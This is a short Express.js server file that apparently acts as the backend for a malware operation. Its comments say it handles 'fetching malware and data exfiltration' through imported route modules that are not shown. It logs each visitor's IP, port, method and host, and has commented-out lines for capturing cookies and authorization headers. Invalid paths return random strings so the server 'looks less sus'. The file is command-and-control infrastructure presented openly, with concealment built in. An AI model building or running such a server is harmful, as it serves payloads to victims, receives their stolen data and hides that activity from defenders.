const express = require("express");
const server = express();

const util = require("./util.js");
const malware_reqs = require("./get_req.js");
const malware_data = require("./post_req.js");

// Log incoming traffic info
server.all("*", (request, response, next) => {
    console.log("\n");
    console.log(`Connection established with ${request.ip} via port ${request.socket.remotePort}.`);
    console.log(`Request Type: ${request.method}`);
    console.log(`Request Host: ${request.headers.host}`)

    // console.log(`Request Cookies: ${request.headers.cookie}`)
    // console.log(`Request Location: ${request.headers.location}`)
    // console.log(`Request Auth: ${request.headers.authorization}`)

    next();
});

// Handle fetching malware and data exfiltration
server.use(malware_reqs);
server.use(malware_data);

// Handle all invalid paths. Generate some random numbers to make it look less sus
server.all("*", (request, response) => {
    response.send(util.genAsciiStr(64));
});

const PORT = 80;
server.listen(PORT, () => {
    console.log(`Server launched on port ${PORT}.`);
});